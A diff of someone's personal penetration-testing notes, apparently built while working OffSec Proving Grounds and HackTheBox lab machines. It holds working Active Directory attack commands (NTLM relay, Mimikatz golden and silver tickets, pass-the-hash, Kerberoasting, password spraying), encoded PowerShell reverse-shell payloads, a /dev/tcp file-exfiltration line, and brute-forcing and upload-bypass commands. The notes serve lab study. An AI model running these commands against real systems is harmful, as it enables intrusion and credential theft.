@@ -1,6 +1,158 @@
 *************************[port maps]*************************
 
-(ospg:shenzi) as i learned from shenzi box that there could be specific directories, i should always brute force and hunt for the box specifics and this means they are not using things in the wordlists and these are ways to dig them out:
+
+[*] ntlm relay attack - execute command without knowing the password
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+
+If we don't use the local Administrator user in pass-the-hash, the target machine also needs to be configured in a certain way to obtain successful code execution. Since Windows Vista, all Windows versions have UAC remote restrictions enabled by default. This prevents software or commands from running with administrative rights on remote systems. This effectively mitigates this attack vector for users in the local administrator group aside from the local Administrator account.
+
+In this example we don't use the local Administrator user for the relay attack as we did for the pass-the-hash attack. Therefore, the target system needs to have UAC remote restrictions disabled or the command execution will fail. If UAC remote restrictions are enabled on the target then we can only use the local Administrator user for the relay attack.
+
+UAC remote restrictions limit the users we can use in pass-the-hash or relay attacks outside of an Active Directory environment.
+
+We already encountered UAC remote restrictions for non-domain joined machines in the Password Attacks Module. However, this kind of restriction does not apply to domain users, meaning that we can leverage full privileges while moving laterally with the techniques shown in this Learning Unit. (in wmi winrm - lateral movement module)
+
+[*] Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain.
+-----------------------------------------
+i found two ways to exploit redis
+(ospg:sybris)
+https://github.com/n0b0dyCN/redis-rogue-server.git
+
+ and
+
+  (ospg:wombo)
+https://medium.com/@Sh1v4/hackthebox-postman-13f55695650b
+this one works
+https://medium.com/@msegmgamal45/wombo-proving-grounds-offsec-806d32d65274
+-----------------------------------------
+(ospg:planetexpress) 
+hacktricks page
+https://book.hacktricks.wiki/en/network-services-pentesting/9000-pentesting-fastcgi.html
+
+[*] fastcgi - turns php that should be a big indicator of lfi to rce 
+
+interesting goby:
+
+find writable folders
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+https://medium.com/@ayeshatahseen79/introduction-to-linux-privilege-escalation-2e9efdb0a92e
+
+------------------------------------------
+(ospg:exghost) upload file using curl 
+curl -v -F myFile=@payload.jpg http://192.168.201.183/exiftest.php
+curl -X POST --data @pshell.php -b "isHuman=1" https://monitorr.robyns-petshop.thm/assets/php/upload.php -k 
+
+an interesting thing happened my PwnKitt did not work but the walkthrough
+https://github.com/joeammond/CVE-2021-4034.git
+worked vertsion of pwnkit
+------------------------------------------------------------------------------
+(ospg:catto) it was a web directory specific that is hidden in the graphsql 
+-----------------------------------------------------------
+(ospg:nagoya) nice way to check user groups using ldap
+https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f
+
+ALSO it is an amazing resource to use local powershell for searching LDAP
+-------------------------------------------
+(ospg:fanatastic) 
+when you have lfi read the services in /etc/systemd/system/prometheus.service as it show you a lot
+grafana solution for crypto
+-----------------------
+(ospg:nagoya) 
+
+convert users to useranarchy
+sed -i -E 's/\s+/,/g' usrs && tr '[:upper:]' '[:lower:]' < usrs > temp.txt && mv temp.txt usrs
+
+cewl --with-numbers --depth 0 --min_word_length 1 http://192.168.203.142/iamGaara   -w pass
+------------------------
+(ospg:confusion) sometime for some reason you need to manually apply the exploit in burpsuite and the script does not work
+-----------------------------
+(ospg:stapler) 
+interesting go by for lfi search for vulnerable files
+https://medium.com/@al3xandersteven/hack-the-box-backdoor-eb58a91ee260
+
+shocking how the user pass if found with -e nsr hydra
+--------------------------------------------
+2 things i want first before something idk or partially know to check from scribd that has most of the things and second a list of powershell for active directory when i am in workstation specifics
+
+
+(ospg:walpaperhub) wow i think the escalation of the library uses html to execute js to get reverse shell
+----------------------------------------------------------
+(ospg:wallpaperhub) after discovering ffuf automation for file upload i decided to make this list of checks for file upload 
+- ffuf for magic (bypass magic)
+- ffuf for extension (bypass extension)
+- file name to path traversal (ospg:wallpaperhub) (Sanitize File Names)
+[*] checklist - seems a good checklist to check after general search 
+https://inside.caratlane.com/comprehensive-security-testing-checklist-for-web-applications-399ec6c53a39 
+- 
+
+
+-------------------------------------------------------------
+(ospg:jordak) interesting lfi to log poisoning to rce exploit CVE-2023-26469
+--------------------------------------------------------------------------
+(ospg:Matrimony) another nice script for file upload without burp request formatting
+nice for docker escalation
+https://al1z4deh.medium.com/proving-grounds-matrimony-a121fa189966
+---------------------------------------------------------------------------------------------------------------------------------------------
+(ospg:surf) when you are stuck in a box to the idk level try tto know the attack vector like authentication bypass in dork it in general
+
+nice go by:
+
+authentication bruteforce: https://noureldinehab.medium.com/authentication-bypass-write-up-walkthrough-654f2b51725e
+--------------------------------------------------
+interesting AD usernames combinations to try
+add a to z to the beginning of the users (htb:thefrizz)
+add different user first name to the user.lastname you have (ospg:feast)
+-----------------------------------------------------------------------
+(ospg:keights) https://medium.com/@isuk4/get-rce-with-ssti-61d929feca2a
+best explanation about python sanbox bypass
+---------------------------------------------------------
+(ospg:vanity) beside magic, extension and content-type i should try special characters for detecting eval or system 
+wfuzz -u http://10.10.11.170:8080/search -d name=FUZZ -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --ss banned
+------------------------------------------------------
+(htb:hospital) to know available php functions
+<?php
+  $dangerous_functions = array("exec", "passthru", "system", "shell_exec", "popen", "proc_open", "pcntl_exec","eval");
+
+  foreach ($dangerous_functions as $f){
+    if (function_exists($f)){
+      echo "\n[+] " . $f . " - EXISTE";
+    }
+  }
+?>
+
+(htb:hospital) https://medium.com/@bdemir/a-pentesters-guide-to-code-injection-dcfa774a4431
+nice cheatsheet for msfvenom av evasion encryption and php reverse shell
+
+another one  that worked
+https://shivrajan.medium.com/use-command-line-tools-in-php-960214715b73
+------------------------------------------------
+ligolo setup
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 240.0.0.1/32 dev ligolo
+sudo ip route add 10.10.139.0/24 dev ligolo
+
+
+delete 
+sudo ip link set ligolo down
+sudo ip tuntap del dev ligolo mode tun
+sudo ip route del 10.10.139.0/24 dev ligolo
+
+
+MATCH (n)
+DETACH DELETE n;
+
+---------------------------------------------------------------------
+(ospg:cockpit)a very shocking way how he reached the sql injection
+https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt 
+---------------------------------------------------------------------
+(ospg:spx) amazing go by to print the important info in phpinfo.php
+https://medium.com/@opabravo/file-upload-bypass-fuzz-magic-bytes-mime-types-with-ffuf-b218171533d4
+
+
+URL="lab.local/upload/phpinfo.php"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; curl -s "$URL" | grep -E 'DOCUMENT_ROOT |USERNAME|RUN_USER|file_uploads|upload_tmp_dir|allow_url_include|allow_url_|disable_functions|session.save_path|PHP Version </td> |Server API </td>|>System </td>|SERVER_SOFTWARE |open_basedir|enable_dl|class="e">SPX|spx.http_enabled|spx.http_key' | html2markdown | sed -n '/|/p' | awk -F'|' '{printf "%-25s %s\n", $1 ":", substr($0, index($0, "|") + 1)}' | sed -E -e 's/( on| enable| 1)/\x1b[31m&\x1b[0m/ig' | tee "phpinfo_${OUT}.txt"
+----------------------------------------------------
+(ospg:shenzi) as i learned from shenzi box that there could be specific directories, i should always brute force and hunt for the box specifics and this means they are not using things in the wordlists and these are ways to dig them out which acan be called the box not general and is specific like in workstation specifics and linpeas:
 
 (htb:friendzone) to find a subdomains that are specific
 vhost specefics
@@ -9,6 +161,19 @@ dig axfr @10.10.10.123 friendzone.red
 (ospg) to find smtp users
 (ospg) to find default ftp users
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.168.52 ftp
+(ospg:shenzi) for not default directories try to guess them from the box name hints etc
+(ospg:) kdc using the username wordlists
+(ospg:) web logins 
+grep -ir 'splunk' /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.csv
+(htb:thefrizz) using useranarchy with letters
+awk -F, '{for(i=65;i<=90;i++) printf "%s,%s\n", $1, sprintf("%c", i)}' users.lst
+awk -F, '{for(i=65;i<=90;i++) printf "%s.%s\n", sprintf("%c", i), $1 }' generateletteruers
+
+(ospg:) after finding a default smtp users you can try using the same username and passs
+(ospg:) generating password if a lot of data shared about the name or the name similar to actor
+(ospg:peppo and postfish) found default users should be tried with the same pass on ssh and smtp
+(htb:manager) use the user for user and pass smb
+(ospg:matrimony) if the dns setup reverse  it dig @192.168.179.171 -x 192.168.179.171
 --------------------------------------------------
 (ospg:depreciated) good for graphql commands 
 ------------------------------------------------
@@ -85,6 +250,9 @@ vhosts:
 /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 
 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb" -H "Host: FUZZ.flight.htb" --hw 530
+
+or the wordlist 
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 
 parameter fuzzing:
 /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
@@ -180,7 +348,7 @@ reproasting
 netexec ldap  192.168.248.158  -u users.kerb   -p '' --asreproast roast.txt
 asreproast mostly need auth so this is un auth method
 impacket-GetUserSPNs  -no-preauth Guest -usersfile users.kerb -dc-host 192.168.248.158 zeus.corp/
-
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete (offsec)
 -----------------------------------------
 for i in $(grep -oP '(?<=[Open ] )\S+' allports | cut -d : -f 2| sort -u);do echo -n $i,;done
 ---------------------------------------------------------------
@@ -253,6 +421,122 @@ cat users.txt | awk -F\\[ '{print $2}' | awk -F\\] '{print $1}' > final_user.txt
 *************************[workstation specifics]*************************
 [there are things you can do in this workstaions with this user that you can not do on the other workstations which will get you a domaion user]
 
+
+(ospg:nagoya)
+find a way to execute stuff inside the machine as a pre-authenticated user so that we you are stuck from outside __like you exploited and inside the machine but does not have the user pass__
+__we performed these attack without access to the plaintext password or password hash of this user.__
+(offsec)
+
+perform asreproast
+.\Rubeus.exe asreproast /nowrap
+
+perform kerberoast
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+perform sliver ticket 
+privilege::debug
+sekurlsa::logonpasswords // ntlm hash of the servicePrincipalName This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
+whoami /user // to get sid and rid for domain and user
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+exit
+klist
+
+perform password Spray //uses LDAP and ADSI to perform a low and slow password attack against AD users
+PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+  
+PS C:\Users\jeff> $PDC = ($domainObj.PdcRoleOwner).Name
+
+PS C:\Users\jeff> $SearchString = "LDAP://"
+
+PS C:\Users\jeff> $SearchString += $PDC + "/"
+
+PS C:\Users\jeff> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+
+PS C:\Users\jeff> $SearchString += $DistinguishedName
+
+PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1 // This password spraying tactic is already implemented in the PowerShell script The PowerShell script automatically identifies domain users and sprays a password against them.
+.\Spray-Passwords.ps1 -Pass/-File Nexus123! -Admin/test admin accounts
+
+
+perform password spray //based on obtaining a TGT 
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!" 
+
+perform pass the ticket // The TGT is typically tied to the user session in which it was created and cannot be reused elsewhere, while service tickets (TGS) can often be exported and reused across systems, offering more flexibility. The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere
+
+sekurlsa::tickets /export
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+
+perform pass the hash // after passing the hash klist will show nothing but after net use \\files04 klist will show TGT TGS NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication continuing PsExec can run a command remotely but does not accept password hashes Since we have generated we can reuse the TGT to obtain code execution on the files04 host this method is like the relay method it is very nice to rce avoiding cracking the password
+
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+net use \\files04
+.\PsExec.exe \\files04 cmd
+
+perform golden ticket // Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain. Starting July 2022, Microsoft improved the authentication process, so we'll need to provide an existing account. Let's set the golden ticket's username to jen. Before it didn't matter if the account existed. If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. This is illustrated in the listing below.
+
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+misc::cmd
+PsExec.exe \\dc1 cmd.exe
+
+perform impersonated command execution // based on Windows Management Instrumentation (WMI), It communicates through Remote Procedure Calls (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data. To create a process on the remote target via WMI, we need the credentials of a member of the Administrators local group We already encountered UAC remote restrictions for non-domain joined machines in the Password Attacks Module. However, this kind of restriction does not apply to domain users, meaning that we can leverage full privileges.
+
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
+
+
+perform impersonated command execution //wmi using powershell
+PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
+PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+
+PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+
+PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+
+perform impersonated command execution // For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.
+
+winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
+
+perform impersonated command execution // PowerShell also has WinRM built-in capabilities called PowerShell remoting
+
+PS C:\Users\jeff> $username = 'jen';
+PS C:\Users\jeff> $password = 'Nexus123!';
+PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+PS C:\Users\jeff> Enter-PSSession 1
+
+To get the SPN
+Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+-----------------------------------------------------------
+(ospg:marketing) 
+cat file.txt > /dev/tcp/10.10.10.189/9001
+nc -nvlp 9001 > file.txt
+------------------------------------------------------------------------
+(htb:ippsec:updown)  
+[*]]] python2 input to rce
+--------------------------------------
+wildcard can be used for path traversal or adding arguments to get escalated
+----------------------------------------------------
+(ospg:Matrimony) another nice script for file upload without burp request formatting
+nice for docker escalation
+https://al1z4deh.medium.com/proving-grounds-matrimony-a121fa189966
+------------------------------------------------------------
+(htb:hospital) amazing resource for meterpreter keystroke
+----------------------------------------------------------------------------------------
+wildcard priv esc https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+---------------------------------------------
+(ospg:spx) you should find someway to replace the makefile with anotherone to privesc
+----------------------------------------------------------------------------
+(ospg:banzai) nice writeup for exploiting exploitdb mysql privesc manually
+------------------------------------------------------------
 (ospg:chatty) command to find uncommon s perm 
 find / -perm -u=s 2>/dev/null | grep -v '/proc\|/run\|/sys\|/snap' 
 ------------------------------
@@ -455,6 +739,8 @@ python2 42315.py
 https://medium.com/@opabravo/file-upload-bypass-fuzz-magic-bytes-mime-types-with-ffuf-b218171533d4
 (ospg MZEEAV) you can fuzz the magicbytes that will bypass and be uploaded using
 ffuf -c --request-proto http -w <(while read h; do echo $(echo $h | xxd -r -p); done < /opt/wordlists/custom/magic_bytes_hex.txt) -request upload.req -fr 'Unsupported file type!'
+
+wordlist from :https://github.com/FanaticPythoner/pyMagicBytes/blob/master/DB
 ----------------------------------------------------------
 (htb:querier) Groups.xml path
 https://medium.com/@hughbrown123/walk-through-hints-querier-htb-0726d5b18961
@@ -463,6 +749,24 @@ https://medium.com/@hughbrown123/walk-through-hints-querier-htb-0726d5b18961
 
 
 *************************[group specifics]*************************
+
+
+
+[*] service - can be used for addition path vector user access to the machine
+    - use the service itself as part of the process
+    - Silver Ticket Attacks
+-------------------------------------------
+(ospg:) 
+[*] genericall - allows you to impersonate admin or any user in the domain
+
+genericall remote exploit 
+https://arz101.medium.com/vulnlab-push-13d1e89878ae
+
+nice goby for genericall and AllExtendedRights
+https://medium.com/learning-cybersecurity/proving-grounds-hutch-pentest-report-88bb6bf7ee15
+[*] genericall - allow reading LAPS
+
+-------------------------------------------
 (ospg:hutch) LAPS enables you to get the domain admin password using ldap if enabled
 ---------------------------------------------------------------------------------------
 (htb:escapetwo) 
@@ -484,6 +788,7 @@ port maps under conditions
 https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/
  - can enable you to have RCE when there is a zip file in the box that contain a rev.php (zipper)
 [*] XXE - enables you to read files 
+[*] SSRF - can lead to using file protocol scheme if gopher is allowed (htb:ippsec:updown)
 [*] 7za,7z wild card to privesc
 https://0xdf.gitlab.io/2024/08/10/htb-usage.html
 [*] LFI to rce - when the parameter request the file from external resource and inject in the page as src bbut python does not allow that 
@@ -492,7 +797,7 @@ https://0xdf.gitlab.io/2024/08/10/htb-usage.html
 [*] lfi - also can be SSRF (htb:love) 
 [*] lfi - can enables you to know if the process is running as admin or high priv user (ospg:fish)
 [*] lfi - enabels you to read config files of programs aftter you  dive the internet for paths (ospg:fish)
-[*] lfi - log poisoning to RCE
+[*] lfi - log poisoning to RCE (ospg:jordak)
 
 [*] insecure deserialization - enable you to RCE
 [+] traversal
@@ -505,6 +810,7 @@ ftp
 
 
 gobuster
+[*] lfi - rce using php://phar/ with jpeg (htb:ippsec:updown) which is like php://zip exploit
 [*] dir more to find the app version
 
 [*] XSS - enables you to steal the admins cookie and access as the admin if the form can be viewed by him and depend if the httponly flag is set or not (check the two ippsec videos formulax httponly set)
@@ -520,7 +826,7 @@ ALL 180
 [*] lfi  - enables you to knows the password or current command running with reading
 /proc/self/cmdline
 
-[*] path traversal or lfi  creds dumping - read the web server config documentations to know where the passwords stored
+[*] path traversal or lfi  creds dumping - read the web server config documentations to know where the passwords stored 
 
 [*] path traversal to rce - after reading the /etc/passwd see the users and try to read their id_rsa
 
@@ -528,6 +834,9 @@ ALL 180
 
 [*] login page ? possible SQL injection
 
+[*] lfi - can lead to php session poisoning nice writeup for php session poisoning which is like log posining https://medium.com/@YNS21/php-session-poisoning-using-lfi-36d7df012777
+
+[*] cookie sandwitch - https://blog.snoopbees.com/http-cookie-sandwich-attack-6ba8110e0e02
 
 CVES and the scripts that exploit you must understand becasue it is the things that makes you better connecting the ports without the need for scripts
 
@@ -566,6 +875,8 @@ https://medium.com/@aslam.mahimkar/blind-sqli-to-rce-remote-code-execution-jarvi
 +++++++++++++++++++++++++++
 
 
+SQL boxes:
+(ospg:matrimony)
 like sqlmap: https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
 indork: site:medium.com "';waitfor"
 
